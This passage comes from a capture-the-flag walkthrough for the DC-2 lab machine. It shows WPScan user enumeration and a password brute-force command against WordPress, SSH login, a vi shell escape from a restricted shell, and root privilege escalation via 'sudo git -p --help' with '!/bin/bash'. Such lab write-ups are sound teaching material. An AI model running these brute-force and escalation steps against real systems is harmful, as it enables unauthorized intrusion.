href="https://github.com/WordPress/WordPress/commit/9db44754b9e4044690a6c32fd74b9d5fe26b07b2">https://github.com/WordPress/WordPress/commit/9db44754b9e4044690a6c32fd74b9d5fe26b07b2</a><br /> |      - <a href="https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html">https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html</a><br /> |<br /> | [!] Title: WordPress &lt;= 5.2.3 - Admin Referrer Validation<br /> |     Fixed in: 4.7.15<br /> |     References:<br /> |      - <a href="https://wpvulndb.com/vulnerabilities/9913">https://wpvulndb.com/vulnerabilities/9913</a><br /> |      - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17675">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17675</a><br /> |      - <a href="https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/">https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/</a><br /> |      - <a href="https://github.com/WordPress/WordPress/commit/b183fd1cca0b44a92f0264823dd9f22d2fd8b8d0">https://github.com/WordPress/WordPress/commit/b183fd1cca0b44a92f0264823dd9f22d2fd8b8d0</a><br /> |      - <a href="https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html">https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html</a><br /><br />[+] WordPress theme in use: twentyseventeen<br /> | Location: <a href="http://dc-2/wp-content/themes/twentyseventeen/">http://dc-2/wp-content/themes/twentyseventeen/</a><br /> | Last Updated: 2019-05-07T00:00:00.000Z<br /> | Readme: <a href="http://dc-2/wp-content/themes/twentyseventeen/README.txt">http://dc-2/wp-content/themes/twentyseventeen/README.txt</a><br /> | [!] The version is out of date, the latest version is 2.2<br /> | Style URL: <a href="http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10">http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10</a><br /> | Style Name: Twenty Seventeen<br /> | Style URI: <a href="https://wordpress.org/themes/twentyseventeen/">https://wordpress.org/themes/twentyseventeen/</a><br /> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...<br /> | Author: the WordPress team<br /> | Author URI: <a href="https://wordpress.org/">https://wordpress.org/</a><br /> |<br /> | Detected By: Css Style (Passive Detection)<br /> |<br /> | Version: 1.2 (80% confidence)<br /> | Detected By: Style (Passive Detection)<br /> |  - <a href="http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10,">http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10,</a> Match: 'Version: 1.2'<br /><br />[+] Enumerating Users (via Passive and Aggressive Methods)<br /> Brute Forcing Author IDs - Time: 00:00:00 &lt;==&gt; (10 / 10) 100.00% Time: 00:00:00<br /><br />[i] User(s) Identified:<br /><br />[+] admin<br /> | Detected By: Rss Generator (Passive Detection)<br /> | Confirmed By:<br /> |  Wp Json Api (Aggressive Detection)<br /> |   - <a href="http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1">http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</a><br /> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br /> |  Login Error Messages (Aggressive Detection)<br /><br />[+] jerry<br /> | Detected By: Wp Json Api (Aggressive Detection)<br /> |  - <a href="http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1">http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</a><br /> | Confirmed By:<br /> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br /> |  Login Error Messages (Aggressive Detection)<br /><br />[+] tom<br /> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br /> | Confirmed By: Login Error Messages (Aggressive Detection)<br /><br /><br />[+] Finished: Fri Nov  1 21:54:38 2019<br />[+] Requests Done: 73<br />[+] Cached Requests: 6<br />[+] Data Sent: 14.291 KB<br />[+] Data Received: 26.194 MB<br />[+] Memory used: 106.07 MB<br />[+] Elapsed time: 00:00:02<br /><br /><img src="images/16-5.png" alt="images/16-5.png" /><br /><br /><img src="images/16-6.png" alt="images/16-6.png" /><br /><br />Create file users.txt with usernames to brute force logins:<br /><br /><img src="images/16-7.png" alt="images/16-7.png" /><br /><br />wpscan --url <a href="http://dc-2/">http://dc-2/</a> -P dc2_cewl.txt -U dc2_users<br /><br /><img src="images/16-8.png" alt="images/16-8.png" /><br /><br />Logged in as jerry:<br /><br /><img src="images/16-9.png" alt="images/16-9.png" /><br /><br /><br /><img src="images/16-10.png" alt="images/16-10.png" /><br /><br />Logged in as tom:<br />-- found nothing<br /><br />root@kali:~# ssh -p7744 tom@192.168.56.107<br />tom@192.168.56.107's password: <br /><br />The programs included with the Debian GNU/Linux system are free software;<br />the exact distribution terms for each program are described in the<br />individual files in /usr/share/doc/*/copyright.<br /><br />Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br />permitted by applicable law.<br />tom@DC-2:~$ ls<br />flag3.txt  usr<br />tom@DC-2:~$<br /><br />run:<br />$vi<br /><br />and then in vim:<br />:shell<br /><br />$ /bin/cat flag3.txt<br />Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.<br />$ <br /><br />$ /bin/su - jerry<br />Password: <br />jerry@DC-2:~$ ls<br />flag4.txt<br />jerry@DC-2:~$ <br /><br />jerry@DC-2:~$ cat flag4.txt<br />Good to see that you've made it this far - but you're not home yet. <br /><br />You still need to get the final flag (the only flag that really counts!!!).  <br /><br />No hints here - you're on your own now.  :-)<br /><br />Go on - git outta here!!!!<br /><br />jerry@DC-2:~$ find / -perm /4000 2&gt;/dev/null<br />/usr/bin/gpasswd<br />/usr/bin/newgrp<br />/usr/bin/sudo<br />/usr/bin/chfn<br />/usr/bin/chsh<br />/usr/bin/passwd<br />/usr/bin/procmail<br />/usr/bin/at<br />/usr/lib/openssh/ssh-keysign<br />/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br />/usr/lib/eject/dmcrypt-get-device<br />/usr/sbin/exim4<br />/bin/umount<br />/bin/mount<br />/bin/su<br />jerry@DC-2:~$ <br /><br />jerry@DC-2:~$ sudo -l<br />Matching Defaults entries for jerry on DC-2:<br />    env_reset, mail_badpass,<br />    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br /><br />User jerry may run the following commands on DC-2:<br />    (root) NOPASSWD: /usr/bin/git<br />jerry@DC-2:~$ <br /><br />jerry@DC-2:~$ sudo git -p --help<br />usage: git [--version] [--help] [-C &lt;path&gt;] [-c name=value]<br />           [--exec-path[=&lt;path&gt;]] [--html-path] [--man-path] [--info-path]<br />           [-p|--paginate|--no-pager] [--no-replace-objects] [--bare]<br />           [--git-dir=&lt;path&gt;] [--work-tree=&lt;path&gt;] [--namespace=&lt;name&gt;]<br />           &lt;command&gt; [&lt;args&gt;]<br /><br />The most commonly used git commands are:<br />   add        Add file contents to the index<br />   bisect     Find by binary search the change that introduced a bug<br />   branch     List, create, or delete branches<br />   checkout   Checkout a branch or paths to the working tree<br />   clone      Clone a repository into a new directory<br />!/bin/bash<br /><br />root@DC-2:/home/jerry# cd /root<br />root@DC-2:~# ls<br />final-flag.txt<br />root@DC-2:~# cat final-flag.txt<br /> __    __     _ _       _                    _ <br />/ / /\ \ \___| | |   __| | ___  _ __   ___  / \<br />\ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \/  /<br /> \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ <br />  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   <br /><br /><br />Congratulatons!!!<br /><br />A special thanks to all those who sent me tweets<br />and provided me with feedback - it's all greatly<br />appreciated.<br /><br />If you enjoyed this CTF, send me a tweet via @DCAU7.<br /><br />root@DC-2:~# <br /><br /><img src="images/16-11.png" alt="images/16-11.png" /><br /><br />FIN<br /><br /></div></div>
</body></html>